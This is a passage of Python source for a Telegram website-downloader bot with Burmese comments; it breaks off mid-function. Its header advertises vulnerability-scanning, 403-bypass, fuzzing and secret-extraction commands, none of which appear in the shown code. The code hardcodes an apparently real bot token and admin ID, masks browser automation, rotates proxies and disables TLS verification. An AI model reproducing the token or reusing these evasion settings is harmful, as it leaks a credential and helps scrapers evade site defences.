#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════╗
# ║       Website Downloader Bot  v17.0  (Secure+Full Edition)  ║
# ║  ✅ SSRF Protection       ✅ Path Traversal Fix             ║
# ║  ✅ DB Race Condition Fix  ✅ Rate Limiting                  ║
# ║  ✅ Subprocess Injection   ✅ Log Sanitization              ║
# ║  ✅ Admin Auth Hardened    ✅ File Size Limit               ║
# ║  ✅ Resume Download        ✅ 50MB Split                    ║
# ║  ✅ JS/React/Vue Support   ✅ /vuln CF-aware Scanner        ║
# ║  ✅ Proxy Rotation         ✅ Health Check + Auto-Failover  ║
# ║  ✅ Timeout/Retry Fix      ✅ Termux Network Stable         ║
# ║  ✅ /tech Fingerprint       ✅ /extract Secret Scanner      ║
# ║  ✅ /monitor Alerts         ✅ /bypass403 Bypass Tester     ║
# ║  ✅ /subdomains Enum        ✅ /fuzz Path+Param Fuzzer      ║
# ╚══════════════════════════════════════════════════════════════╝
#
# Server Setup:
#   apt update && apt install -y python3 python3-pip
#   pip install python-telegram-bot requests beautifulsoup4 python-dotenv playwright
#   playwright install chromium
#   playwright install-deps chromium
#   cp .env.example .env   # ပြီးရင် .env ထဲ token ထည့်ပါ
#   python web_downloader_bot.py
# ══════════════════════════════════════════════════════════════

import os, re, json, time, shutil, zipfile, hashlib, hmac, string, struct, tempfile
import logging, asyncio, subprocess, socket, random, difflib, functools
import concurrent.futures
from datetime import datetime, date
from ipaddress import ip_address, ip_network, AddressValueError
from urllib.parse import urljoin, urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from telegram.error import BadRequest, RetryAfter, TimedOut, NetworkError
from telegram.request import HTTPXRequest

# ── dotenv (optional but recommended) ────────────
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # pip install python-dotenv မလုပ်ရသေးရင် skip

# ══════════════════════════════════════════════════
# ⚙️  CONFIG  —  .env မှ ယူသည် (fallback: hardcode)
# ══════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN", "8518710995:AAGhqSXxhkdg_O5ItrBcQZ6LEw7Esxx_TQg")
ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "1964475260").split(",")))
SECRET_KEY = os.getenv("SECRET_KEY", hashlib.sha256(os.urandom(32)).hexdigest())

DOWNLOAD_DIR    = os.path.expanduser("~/downloads/web_sources")
DB_FILE         = os.path.expanduser("~/downloads/bot_db.json")
RESUME_DIR      = os.path.expanduser("~/downloads/resume_states")
APP_ANALYZE_DIR = os.path.expanduser("~/downloads/app_analysis")
APP_MAX_MB      = int(os.getenv("APP_MAX_MB", "150"))   # max upload size

DAILY_LIMIT      = int(os.getenv("DAILY_LIMIT", "5"))
MAX_WORKERS      = 5
MAX_PAGES        = 50
MAX_ASSETS       = 500
TIMEOUT          = 20
SPLIT_MB         = 45
MAX_ASSET_MB     = 100          # single asset max size
RATE_LIMIT_SEC   = 15           # per-user cooldown between requests

# ── Proxy config ────────────────────────────────────
PROXY_FILE        = os.getenv("PROXY_FILE",
                       os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt"))
PROXY_FILE_URL    = os.getenv("PROXY_FILE_URL", "")
PROXY_ENABLED     = os.getenv("PROXY_ENABLED", "true").lower() not in ("0", "false", "no")
PROXY_TIMEOUT     = int(os.getenv("PROXY_TIMEOUT", "8"))
PROXY_REFRESH_MIN = int(os.getenv("PROXY_REFRESH_MIN", "30"))
# ══════════════════════════════════════════════════

logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ── Ensure all directories exist BEFORE file handler ─
for d in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
    os.makedirs(d, exist_ok=True)

# ── File log (session ပိတ်ရင်လည်း error မပျောက်ဖို့) ───
_file_handler = logging.FileHandler(
    os.path.expanduser("~/downloads/bot.log"), encoding="utf-8"
)
_file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(_file_handler)

download_semaphore: asyncio.Semaphore  # initialized in main()

# ── Queue system ──────────────────────────────────
QUEUE_MAX     = 20                    # max queue depth
_dl_queue: asyncio.Queue | None = None  # initialized in main()
_queue_pos: dict = {}                 # {uid: position}

# ── Auto-delete config ────────────────────────────
FILE_EXPIRY_HOURS = int(os.getenv("FILE_EXPIRY_HOURS", "24"))   # 24h ကြာရင် auto-delete

# ── Global locks / state ──────────────────────────
db_lock: asyncio.Lock                      # initialized in main()
user_last_req    = {}                      # rate limit tracker {uid: timestamp}
_cancel_flags: dict = {}                   # {uid: asyncio.Event} — /stop signal

HEADERS = {
    'User-Agent': (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        'AppleWebKit/537.36 (KHTML, like Gecko) '
        'Chrome/120.0.0.0 Safari/537.36'
    )
}

# ── Playwright check ──────────────────────────────
def _check_playwright() -> bool:
    try:
        from playwright.sync_api import sync_playwright
        return True
    except ImportError:
        return False

PLAYWRIGHT_OK = _check_playwright()


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 1 — SSRF Protection
# ══════════════════════════════════════════════════

_BLOCKED_NETS = [
    ip_network("127.0.0.0/8"),
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
    ip_network("169.254.0.0/16"),   # AWS/cloud metadata
    ip_network("100.64.0.0/10"),    # Carrier-grade NAT
    ip_network("0.0.0.0/8"),
    ip_network("::1/128"),
    ip_network("fc00::/7"),
    ip_network("fe80::/10"),
]

def _is_safe_ip(ip_str: str) -> bool:
    try:
        ip_obj = ip_address(ip_str)
        for net in _BLOCKED_NETS:
            if ip_obj in net:
                return False
        return True
    except (AddressValueError, ValueError):
        return False

def is_safe_url(url: str) -> tuple:
    """
    URL ကို validate လုပ်တယ်
    Returns: (is_safe: bool, reason: str)
    """
    if not url or len(url) > 2048:
        return False, "URL too long or empty"

    try:
        parsed = urlparse(url)
    except Exception:
        return False, "Invalid URL format"

    # Scheme စစ်
    if parsed.scheme not in ('http', 'https'):
        return False, f"Scheme '{parsed.scheme}' not allowed (http/https only)"

    # Hostname စစ်
    hostname = parsed.hostname
    if not hostname:
        return False, "No hostname"

    # Null byte / encoded traversal
    if '\x00' in url or '%00' in url:
        return False, "Null byte detected"

    # URL format — allowed chars only
    if not re.match(r'^https?://[^\s<>"{}|\\^`\[\]]+$', url):
        return False, "Invalid characters in URL"

    # DNS resolve + IP check
    try:
        ip_str = socket.gethostbyname(hostname)
        if not _is_safe_ip(ip_str):
            return False, f"IP {ip_str} is in a blocked network range"
    except socket.gaierror:
        return False, f"Cannot resolve hostname: {hostname}"

    return True, "OK"


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 2 — Path Traversal Protection
# ══════════════════════════════════════════════════

def safe_local_path(domain_dir: str, url: str) -> str:
    """
    URL → local path  (path traversal safe)
    """
    parsed = urlparse(url)
    path = parsed.path.lstrip('/')

    if not path or path.endswith('/'):
        path = path + 'index.html'

    _, ext = os.path.splitext(path)
    if not ext:
        path += '.html'

    if parsed.query:
        sq = re.sub(r'[^\w]', '_', parsed.query)[:20]
        base, ext = os.path.splitext(path)
        path = f"{base}_{sq}{ext}"

    # ── Path traversal check ──────────────────────
    local = os.path.normpath(os.path.join(domain_dir, path))
    real_domain = os.path.realpath(domain_dir)
    real_local  = os.path.realpath(os.path.join(domain_dir, path))

    if not real_local.startswith(real_domain + os.sep) and real_local != real_domain:
        # Traversal attempt → fallback to safe hash-based name
        logger.warning(f"Path traversal attempt blocked: {url}")
        safe_name = hashlib.md5(url.encode()).hexdigest()[:16]
        ext_guess = os.path.splitext(parsed.path)[1][:8] or '.bin'
        local = os.path.join(domain_dir, "assets", safe_name + ext_guess)

    os.makedirs(os.path.dirname(local), exist_ok=True)
    return local


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 3 — Rate Limiting
# ══════════════════════════════════════════════════

def check_rate_limit(user_id: int) -> tuple:
    """
    Returns: (allowed: bool, wait_seconds: int)
    """
    now  = time.time()
    last = user_last_req.get(user_id, 0)
    diff = now - last
    if diff < RATE_LIMIT_SEC:
        wait = int(RATE_LIMIT_SEC - diff) + 1
        return False, wait
    user_last_req[user_id] = now
    return True, 0


# ══════════════════════════════════════════════════
# 🌐  PROXY MANAGER  — Rotation + Health + Failover
# ══════════════════════════════════════════════════

import threading as _threading

class ProxyManager:
    """
    Full proxy manager:
      - Load from local proxies.txt OR GitHub raw URL
      - Health-check all proxies concurrently on load
      - Round-robin rotation (thread-safe)
      - Mark failed proxies with cooldown
      - Auto-refresh list every PROXY_REFRESH_MIN minutes
    
    Supported formats in proxies.txt:
      1.2.3.4:8080
      http://1.2.3.4:8080
      https://1.2.3.4:3128
      socks5://1.2.3.4:1080
      http://user:pass@1.2.3.4:8080
    """

    COOLDOWN_SEC = 300   # 5 min cooldown for failed proxy

    def __init__(self):
        self._lock        = _threading.Lock()
        self._all: list   = []      # all loaded proxy URLs
        self._live: list  = []      # currently healthy proxies
        self._idx: int    = 0       # round-robin pointer
        self._failed: dict = {}     # {proxy_url: failed_at_timestamp}
        self._last_load   = 0.0
        self._loaded      = False
        if PROXY_ENABLED:
            self._load_and_check()

    # ── Loading ───────────────────────────────────
    def _fetch_raw(self) -> str:
        """Fetch proxy list text from URL or local file."""
        if PROXY_FILE_URL:
            try:
                r = requests.get(PROXY_FILE_URL, timeout=15, verify=False)
                r.raise_for_status()
                logger.info("ProxyManager: loaded %d bytes from URL", len(r.text))
                return r.text
            except Exception as e:
                logger.warning("ProxyManager: URL fetch failed (%s), trying local file", e)
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r', encoding='utf-8') as f:
                return f.read()
        return ""

    def _parse(self, raw: str) -> list:
        """Parse proxy list text → list of normalized proxy URLs."""
        proxies = []
        for line in raw.splitlines():
            line = line.split('#')[0].strip()   # strip comments
            if not line:
                continue
            # Already has scheme?
            if '://' in line:
                proxies.append(line)
            else:
                # plain ip:port or user:pass@ip:port
                proxies.append('http://' + line)
        return list(dict.fromkeys(proxies))   # deduplicate, preserve order

    def _health_check_one(self, proxy_url: str) -> bool:
        """Test one proxy — returns True if alive."""
        test_url = "http://httpbin.org/ip"
        try:
            r = requests.get(
                test_url,
                proxies={"http": proxy_url, "https": proxy_url},
                timeout=PROXY_TIMEOUT, verify=False
            )
            return r.status_code == 200
        except Exception:
            return False

    def _load_and_check(self):
        """Load list, health-check concurrently, populate _live."""
        raw = self._fetch_raw()
        parsed = self._parse(raw)
        if not parsed:
            logger.warning("ProxyManager: no proxies found in source")
            with self._lock:
                self._all  = []
                self._live = []
                self._loaded = True
                self._last_load = time.time()
            return

        logger.info("ProxyManager: checking %d proxies...", len(parsed))
        live = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            fmap = {ex.submit(self._health_check_one, p): p for p in parsed}
            for fut in concurrent.futures.as_completed(fmap, timeout=60):
                proxy = fmap[fut]
                try:
                    ok = fut.result(timeout=PROXY_TIMEOUT + 2)
                except Exception:
                    ok = False
                if ok:
                    live.append(proxy)

        with self._lock:
            self._all    = parsed
            self._live   = live
            self._idx    = 0
            self._failed = {}
            self._loaded = True
            self._last_load = time.time()

        logger.info("ProxyManager: %d/%d proxies alive", len(live), len(parsed))

    def reload(self):
        """Force reload + recheck (call from admin command)."""
        self._load_and_check()

    def _maybe_refresh(self):
        """Auto-refresh if list is stale."""
        if time.time() - self._last_load > PROXY_REFRESH_MIN * 60:
            _threading.Thread(target=self._load_and_check, daemon=True).start()

    # ── Getting a proxy ───────────────────────────
    def get_proxy(self) -> dict | None:
        """
        Return a requests-compatible proxy dict or None.
        {"http": "http://ip:port", "https": "http://ip:port"}
        Rotates round-robin, skips proxies in cooldown.
        """
        if not PROXY_ENABLED:
            return None
        self._maybe_refresh()
        with self._lock:
            if not self._live:
                return None
            now = time.time()
            # Build candidate list (skip cooldown)
            candidates = [
                p for p in self._live
                if now - self._failed.get(p, 0) > self.COOLDOWN_SEC
            ]
            if not candidates:
                # All in cooldown — clear and retry all
                self._failed.clear()
                candidates = list(self._live)
            if not candidates:
                return None
            proxy_url = candidates[self._idx % len(candidates)]
            self._idx += 1
            return {"http": proxy_url, "https": proxy_url}

    def mark_failed(self, proxy_dict: dict | None):
        """Call when a request through this proxy failed."""
        if not proxy_dict:
            return
        proxy_url = proxy_dict.get("http") or proxy_dict.get("https")
        if proxy_url:
            with self._lock:
                self._failed[proxy_url] = time.time()
                logger.debug("ProxyManager: marked failed → %s", proxy_url)

    # ── Info ──────────────────────────────────────
    def stats(self) -> dict:
        with self._lock:
            now = time.time()
            in_cooldown = sum(
                1 for p, t in self._failed.items()
                if now - t < self.COOLDOWN_SEC
            )
            return {
                "total":       len(self._all),
                "live":        len(self._live),
                "in_cooldown": in_cooldown,
                "available":   max(0, len(self._live) - in_cooldown),
                "last_load":   datetime.fromtimestamp(self._last_load).strftime("%H:%M:%S")
                               if self._last_load else "never",
                "enabled":     PROXY_ENABLED,
                "source":      PROXY_FILE_URL or PROXY_FILE,
            }

    def add_proxy(self, proxy_url: str) -> bool:
        """Add a single proxy (no health check, just append)."""
        if '://' not in proxy_url:
            proxy_url = 'http://' + proxy_url
        with self._lock:
            if proxy_url not in self._all:
                self._all.append(proxy_url)
            if proxy_url not in self._live:
                self._live.append(proxy_url)
        # health check in background
        def _check():
            ok = self._health_check_one(proxy_url)
            if not ok:
                with self._lock:
                    if proxy_url in self._live:
                        self._live.remove(proxy_url)
                logger.info("ProxyManager: added proxy DEAD → %s", proxy_url)
            else:
                logger.info("ProxyManager: added proxy alive → %s", proxy_url)
        _threading.Thread(target=_check, daemon=True).start()
        return True

    def list_proxies(self) -> list:
        with self._lock:
            now = time.time()
            result = []
            for p in self._all:
                in_cd = now - self._failed.get(p, 0) < self.COOLDOWN_SEC
                alive = p in self._live
                result.append({"proxy": p, "alive": alive, "cooldown": in_cd})
            return result


# ── Global singleton ──────────────────────────────
proxy_manager = ProxyManager()


def _req_with_proxy(method: str, url: str, **kwargs):
    """
    Drop-in for requests.get/post that auto-rotates proxy.
    Retries once with next proxy on failure.
    """
    for attempt in range(2):
        px = proxy_manager.get_proxy()
        try:
            resp = requests.request(method, url, proxies=px, **kwargs)
            return resp
        except Exception as e:
            proxy_manager.mark_failed(px)
            if attempt == 1:
                raise
    raise RuntimeError("All proxies failed")


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 4 — Log Sanitization
# ══════════════════════════════════════════════════

async def safe_edit(msg, text: str, **kwargs):
    """
    Edit a Telegram message safely.
    Silently ignores BadRequest 'Message is not modified' errors.
    """
    try:
        await msg.edit_text(text, **kwargs)
    except BadRequest as e:
        if "message is not modified" in str(e).lower():
            pass  # Content unchanged — not an error
        else:
            raise  # Re-raise real BadRequest errors


def sanitize_log_url(url: str) -> str:
    """Query string တွေ (passwords/tokens) ကို log မှာ မပြဘဲ REDACTED လုပ်"""
    try:
        parsed = urlparse(url)
        # query ရှိရင် redact
        sanitized = parsed._replace(
            query="[REDACTED]" if parsed.query else "",
            fragment=""
        ).geturl()
        return sanitized
    except Exception:
        return "[INVALID_URL]"

def log_info(msg: str, *args):
    logger.info(msg, *args)

def log_warn(url: str, extra: str = ""):
    safe_url = sanitize_log_url(url)
    logger.warning(f"{safe_url} {extra}")


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 5 — Admin Auth Hardened
# ══════════════════════════════════════════════════

async def verify_admin(update: Update) -> bool:
    """
    Admin verification — multi-layer check
    """
    uid = update.effective_user.id

    # Layer 1: ID check
    if uid not in ADMIN_IDS:
        return False

    # Layer 2: Private chat only (admin commands in group = dangerous)
    if update.effective_chat.type != "private":
        await update.effective_message.reply_text(
            "⚠️ Admin commands ကို private chat မှာသာ သုံးနိုင်ပါတယ်"
        )
        return False

    # Layer 3: Not a forwarded message (anti-spoofing)
    # forward_origin = newer PTB | forward_date = older PTB version
    if update.message:
        is_forwarded = (
            getattr(update.message, 'forward_origin', None) or
            getattr(update.message, 'forward_date', None)
        )
        if is_forwarded:
            return False

    return True

def admin_only(func):
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await verify_admin(update):
            # ── Admin command — user မြင်ရင်မကောင်းဘူး — silent ignore ──
            return
        return await func(update, context)
    return wrapper

def user_guard(func):
    """Decorator — bot enabled check + banned check for regular user commands."""
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        db  = await db_read()
        if uid not in ADMIN_IDS:
            if not db.get("settings", {}).get("bot_enabled", True):
                await update.effective_message.reply_text(
                    "🚫 Bot ကို ယာယီပိတ်ထားသည်။ နောက်မှ ထပ်ကြိုးစားပါ။"
                )
                return
            user = get_user(db, uid)
            if user.get("banned", False):
                await update.effective_message.reply_text(
                    "🚫 သင့် account ကို ပိတ်ထားသည်။"
                )
                return
        return await func(update, context)
    return wrapper



# ══════════════════════════════════════════════════
# 🚨  ADMIN ERROR NOTIFY — Unhandled error → Admin DM
# ══════════════════════════════════════════════════

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler — Admin ဆီ Telegram message ပို့မည်"""
    import traceback
    tb = "".join(traceback.format_exception(
        type(context.error), context.error, context.error.__traceback__
    ))
    short_tb = tb[-1500:] if len(tb) > 1500 else tb   # Telegram 4096 char limit

    # User info (if available)
    user_info = ""
    if update and hasattr(update, "effective_user") and update.effective_user:
        u = update.effective_user
        user_info = f"\n👤 User: `{u.id}` ({u.first_name})"

    msg = (
        "🚨 *Bot Error Alert*\n"
        f"━━━━━━━━━━━━━━━━━━━━{user_info}\n\n"
        f"```\n{short_tb}\n```"
    )

    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=msg,
                parse_mode='Markdown'
            )
        except Exception:
            logger.warning("Admin error notify failed for %d", admin_id)

    logger.error("Unhandled exception: %s", context.error, exc_info=context.error)


# ══════════════════════════════════════════════════
# 🗑️  AUTO-DELETE — Expired download files cleaner
# ══════════════════════════════════════════════════

async def auto_delete_loop():
    """Background task — ၂၄ နာရီ (FILE_EXPIRY_HOURS) ကြာတဲ့ ZIP files auto-delete"""
    while True:
        try:
            now     = time.time()
            deleted = 0
            freed   = 0.0
            for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
                for root, dirs, files in os.walk(folder):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            age_hours = (now - os.path.getmtime(fpath)) / 3600
                            if age_hours >= FILE_EXPIRY_HOURS:
                                size = os.path.getsize(fpath) / 1024 / 1024
                                os.remove(fpath)
                                deleted += 1
                                freed   += size
                        except Exception:
                            pass
            if deleted:
                logger.info(
                    "Auto-delete: %d files | %.1f MB freed (>%dh old)",
                    deleted, freed, FILE_EXPIRY_HOURS
                )
        except Exception as e:
            logger.warning("Auto-delete loop error: %s", e)
        # ၁ နာရီတစ်ကြိမ် check
        await asyncio.sleep(3600)


# ══════════════════════════════════════════════════
# 📋  QUEUE SYSTEM — Download request queue
# ══════════════════════════════════════════════════

async def queue_worker():
    """Background worker — queue ထဲက download request တွေ တစ်ခုစီ run"""
    global _dl_queue
    while True:
        try:
            task = await _dl_queue.get()
            update, context, url, full_site, use_js, resume_mode, uid = task
            # Remove from position tracker
            _queue_pos.pop(uid, None)
            try:
                await _run_download(update, context, url, full_site, use_js, resume_mode)
            except Exception as e:
                logger.error("Queue worker download error: %s", e)
            finally:
                _dl_queue.task_done()
        except Exception as e:
            logger.error("Queue worker error: %s", e)
            await asyncio.sleep(1)


async def enqueue_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool, resume_mode: bool = False
):
    """Download request ကို queue ထဲ ထည့်သည်"""
    global _dl_queue
    uid = update.effective_user.id

    if _dl_queue.qsize() >= QUEUE_MAX:
        await update.effective_message.reply_text(
            f"⚠️ Queue ပြည့်နေပါတယ် (`{QUEUE_MAX}` max)\n"
            "ခဏနေပြီးမှ ထပ်ကြိုးစားပါ",
            parse_mode='Markdown'
        )
        return

    await _dl_queue.put((update, context, url, full_site, use_js, resume_mode, uid))
    pos = _dl_queue.qsize()
    _queue_pos[uid] = pos

    if pos > 1:
        await update.effective_message.reply_text(
            f"📋 *Queue ထဲ ထည့်ပြီးပါပြီ*\n"
            f"📍 Position: `{pos}`\n"
            f"⏳ Download ရောက်လာသည့်အခါ အလိုအလျောက် စမည်",
            parse_mode='Markdown'
        )


# ══════════════════════════════════════════════════
# 📦  DATABASE  (with async lock for race condition)
# ══════════════════════════════════════════════════

def _load_db_sync() -> dict:
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            pass
    return {
        "users": {},
        "settings": {
            "global_daily_limit": DAILY_LIMIT,
            "max_pages": MAX_PAGES,
            "max_assets": MAX_ASSETS,
            "bot_enabled": True
        }
    }

def _save_db_sync(db: dict):
    # Atomic write — temp file → rename
    tmp = DB_FILE + ".tmp"
    with open(tmp, 'w', encoding='utf-8') as f:
        json.dump(db, f, ensure_ascii=False, indent=2)
    os.replace(tmp, DB_FILE)  # atomic on most OS

async def db_read() -> dict:
    """Thread-safe DB read (non-blocking)"""
    loop = asyncio.get_event_loop()
    async with db_lock:
        return await loop.run_in_executor(None, _load_db_sync)

async def db_write(db: dict):
    """Thread-safe DB write (non-blocking)"""
    loop = asyncio.get_event_loop()
    async with db_lock:
        await loop.run_in_executor(None, _save_db_sync, db)

async def db_update(func):
    """
    Thread-safe atomic DB update (non-blocking)
    Usage: await db_update(lambda db: db["users"][uid].update(...))
    """
    loop = asyncio.get_event_loop()
    async with db_lock:
        db = await loop.run_in_executor(None, _load_db_sync)
        func(db)
        await loop.run_in_executor(None, _save_db_sync, db)
        return db

def get_user(db: dict, user_id: int, name: str = "") -> dict:
    uid = str(user_id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "name": name, "banned": False,
            "daily_limit": None, "count_today": 0,
            "last_date": "", "total_downloads": 0,
            "downloads": []
        }
    if name:
        db["users"][uid]["name"] = name
    return db["users"][uid]

def reset_daily(user: dict):
    today = str(date.today())
    if user["last_date"] != today:
        user["count_today"] = 0
        user["last_date"] = today

def get_limit(db: dict, user: dict) -> int:
    return user["daily_limit"] if user["daily_limit"] is not None \
           else db["settings"]["global_daily_limit"]

def can_download(db: dict, user: dict) -> bool:
    reset_daily(user)
    lim = get_limit(db, user)
    return lim == 0 or user["count_today"] < lim

def log_download(user: dict, url: str, size_mb: float, status: str):
    user["downloads"].append({
        "url": sanitize_log_url(url),       # ← sanitized before storing
        "time": datetime.now().strftime("%Y-%m-%d %H:%M"),
        "size_mb": round(size_mb, 2),
        "status": status
    })
    if len(user["downloads"]) > 100:
        user["downloads"] = user["downloads"][-100:]
    user["count_today"] += 1
    user["total_downloads"] += 1


# ══════════════════════════════════════════════════
# 💾  RESUME STATE  (with HMAC integrity)
# ══════════════════════════════════════════════════

def _state_sig(state: dict) -> str:
    data = json.dumps({k: v for k, v in state.items() if k != "_sig"}, sort_keys=True)
    return hmac.HMAC(SECRET_KEY.encode(), data.encode(), hashlib.sha256).hexdigest()

def _resume_path(url: str) -> str:
    return os.path.join(RESUME_DIR, hashlib.md5(url.encode()).hexdigest()[:12] + ".json")

def load_resume(url: str) -> dict:
    path = _resume_path(url)
    empty = {"visited": [], "downloaded": [], "assets": [], "stats": {}}
    if not os.path.exists(path):
        return empty
    try:
        with open(path) as f:
            state = json.load(f)
        sig = state.pop("_sig", "")
        if not hmac.compare_digest(_state_sig(state), sig):
            logger.warning("Resume state integrity check FAILED — ignoring")
            os.remove(path)
            return empty
        return state
    except Exception:
        return empty

def save_resume(url: str, state: dict):
    to_save = dict(state)
    to_save["_sig"] = _state_sig(state)
    tmp = _resume_path(url) + ".tmp"
    with open(tmp, 'w') as f:
        json.dump(to_save, f)
    os.replace(tmp, _resume_path(url))

def clear_resume(url: str):
    p = _resume_path(url)
    if os.path.exists(p):
        os.remove(p)


# ══════════════════════════════════════════════════
# 📊  PROGRESS BAR (Upgraded for Telegram)
# ══════════════════════════════════════════════════

def pbar(done: int, total: int, width: int = 18) -> str:
    """Telegram တွင် ပိုမိုသပ်ရပ်ချောမွေ့စွာ ပြသပေးမည့် Progress Bar"""
    if total <= 0:
        return "│" + " " * width + "│   0%"
    
    pct = min(max(done / total, 0.0), 1.0)
    fill_exact = pct * width
    full_blocks = int(fill_exact)
    remainder = fill_exact - full_blocks

    partials = [" ", "▏", "▎", "▍", "▌", "▋", "▊", "▉"]
    
    bar = "█" * full_blocks
    if full_blocks < width:
        bar += partials[int(remainder * len(partials))]
        bar += " " * (width - full_blocks - 1)

    pct_str = f"{int(pct * 100):>3}%"
    return f"│{bar}│ {pct_str}"

# ══════════════════════════════════════════════════
# 🌐  JS RENDERER  (Playwright — Python native)
# ══════════════════════════════════════════════════

def fetch_with_playwright(url: str) -> str | None:
    """
    Playwright ဖြင့် JS render လုပ်ပြီး HTML ထုတ်ပေးသည်။
    SECURITY: URL validate ပြီးမှသာ browser ဖွင့်သည်။
    """
    if not PLAYWRIGHT_OK:
        return None

    safe, reason = is_safe_url(url)
    if not safe:
        logger.warning(f"Playwright blocked unsafe URL: {reason}")
        return None

    if not re.match(r'^https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]+$', url):
        logger.warning("Playwright blocked URL with invalid characters")
        return None

    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as pw:
            browser = pw.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-dev-shm-usage",
                      "--disable-blink-features=AutomationControlled", "--disable-gpu"]
            )
            ctx = browser.new_context(
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/122.0.0.0 Safari/537.36"
                ),
                viewport={"width": 1366, "height": 768},
                ignore_https_errors=True,
            )
            ctx.add_init_script(
                "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
                "window.chrome={runtime:{}};"
            )
            page = ctx.new_page()
            try:
                page.goto(url, wait_until="networkidle", timeout=40_000)
            except Exception:
                try:
                    page.goto(url, wait_until="load", timeout=25_000)
                except Exception:
                    pass
            html = page.content()
            browser.close()
            return html if html and html.strip() else None
    except Exception as e:
        logger.warning(f"Playwright exception: {type(e).__name__}: {e}")
        return None

def fetch_page(url: str, use_js: bool = False) -> tuple:
    """Returns: (html | None, js_used: bool)"""
    if use_js:
        html = fetch_with_playwright(url)
        if html:
            return html, True
        log_info(f"JS fallback to requests: {sanitize_log_url(url)}")

    try:
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        resp.raise_for_status()
        ct = resp.headers.get('Content-Type', '')
        if 'text/html' not in ct:
            return None, False
        return resp.text, False
    except Exception as e:
        log_warn(url, f"fetch error: {type(e).__name__}")
        return None, False


# ══════════════════════════════════════════════════
# 🔍  ASSET EXTRACTORS
# ══════════════════════════════════════════════════

def extract_assets(html: str, page_url: str) -> set:
    soup   = BeautifulSoup(html, 'html.parser')
    assets = set()

    # ── Standard links / scripts ──────────────────
    for tag in soup.find_all('link', href=True):
        assets.add(urljoin(page_url, tag['href']))
    for tag in soup.find_all('script', src=True):
        assets.add(urljoin(page_url, tag['src']))

    # ── Images (all lazy-load attrs) ──────────────
    LAZY_ATTRS = (
        'src','data-src','data-lazy','data-original','data-lazy-src',
        'data-srcset','data-original-src','data-hi-res-src',
        'data-full-src','data-image','data-img','data-bg',
        'data-background','data-poster','data-thumb',
    )
    for tag in soup.find_all('img'):
        for attr in LAZY_ATTRS:
            v = tag.get(attr, '')
            if v and not v.startswith('data:'):
                assets.add(urljoin(page_url, v))
        for part in tag.get('srcset', '').split(','):
            u = part.strip().split(' ')[0]
            if u: assets.add(urljoin(page_url, u))

    # ── Video / Audio / Media ─────────────────────
    for tag in soup.find_all(['video', 'audio', 'source', 'track']):
        for attr in ('src', 'data-src', 'poster'):
            v = tag.get(attr, '')
            if v: assets.add(urljoin(page_url, v))
    # <video> direct src
    for tag in soup.find_all('video', src=True):
        assets.add(urljoin(page_url, tag['src']))
    # iframe embeds (video players)
    for tag in soup.find_all('iframe', src=True):
        s = tag['src']
        if any(x in s for x in ('youtube','vimeo','player','embed','video')):
            assets.add(urljoin(page_url, s))

    # ── Downloadable files ────────────────────────
    FILE_EXTS = (
        '.pdf','.zip','.rar','.7z','.tar','.gz',
        '.doc','.docx','.xls','.xlsx','.ppt','.pptx',
        '.mp3','.mp4','.avi','.mkv','.mov','.webm',
        '.apk','.exe','.dmg','.iso',
    )
    for tag in soup.find_all('a', href=True):
        h = tag['href']
        full = urljoin(page_url, h)
        low  = full.lower().split('?')[0]
        if any(low.endswith(ext) for ext in FILE_EXTS):
            assets.add(full)

    # ── CSS inline / style tag ────────────────────
    for tag in soup.find_all(style=True):
        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', tag['style']):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
    for st in soup.find_all('style'):
        css = st.string or ''
        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
        for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
            assets.add(urljoin(page_url, u))

    # ── Meta tags (OG image etc) ──────────────────
    for tag in soup.find_all('meta'):
